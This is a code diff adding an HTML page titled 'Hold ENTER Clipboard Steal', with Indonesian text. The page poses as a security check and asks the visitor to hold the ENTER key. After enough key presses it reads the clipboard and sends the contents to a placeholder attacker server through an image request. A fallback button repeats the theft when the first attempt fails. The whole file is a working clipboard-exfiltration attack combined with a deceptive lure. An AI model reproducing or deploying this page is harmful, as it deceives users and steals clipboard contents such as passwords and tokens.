@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Hold ENTER Clipboard Steal</title>
+</head>
+<body style="text-align:center; padding-top:100px; font-family:sans-serif;">
+  <h2>Tekan dan tahan tombol ENTER untuk validasi keamanan</h2>
+  <p id="msg">Menunggu input pengguna...</p>
+  <button id="trigger" style="display:none;">Klik Manual jika gagal</button>
+
+  <script>
+    let counter = 0;
+    let interval;
+    let triggered = false;
+
+    document.body.onkeydown = function(e) {
+      if (e.key === "Enter") {
+        counter++;
+
+        // Mulai interval hitung waktu tahan
+        if (!interval) {
+          interval = setInterval(async () => {
+            if (counter >= 10 && !triggered) {
+              triggered = true;
+              clearInterval(interval);
+              document.getElementById("msg").innerText = "Membaca clipboard...";
+
+              try {
+                // HARUS dalam gesture langsung
+                const permission = await navigator.permissions.query({ name: "clipboard-read" });
+                if (permission.state === "granted" || permission.state === "prompt") {
+                  const text = await navigator.clipboard.readText();
+                  const encoded = encodeURIComponent(text);
+
+                  const img = new Image();
+                  img.src = `https://your-attacker-server.com/log?clip=${encoded}`;
+                  document.getElementById("msg").innerText = "Clipboard terkirim.";
+                } else {
+                  document.getElementById("msg").innerText = "Izin clipboard ditolak.";
+                  document.getElementById("trigger").style.display = "inline";
+                }
+              } catch (err) {
+                document.getElementById("msg").innerText = "Gagal membaca clipboard: " + err;
+                document.getElementById("trigger").style.display = "inline";
+              }
+            }
+          }, 200);
+        }
+      }
+    };
+
+    document.body.onkeyup = function(e) {
+      if (e.key === "Enter") {
+        clearInterval(interval);
+        interval = null;
+        counter = 0;
+      }
+    };
+
+    // Fallback manual button
+    document.getElementById("trigger").onclick = async () => {
+      try {
+        const text = await navigator.clipboard.readText();
+        const encoded = encodeURIComponent(text);
+        const img = new Image();
+        img.src = `https://your-attacker-server.com/log?clip=${encoded}`;
+        document.getElementById("msg").innerText = "Clipboard terkirim (via fallback).";
+      } catch (err) {
+        document.getElementById("msg").innerText = "Gagal membaca clipboard (fallback): " + err;
+      }
+    };
+  </script>
+</body>
+</html>
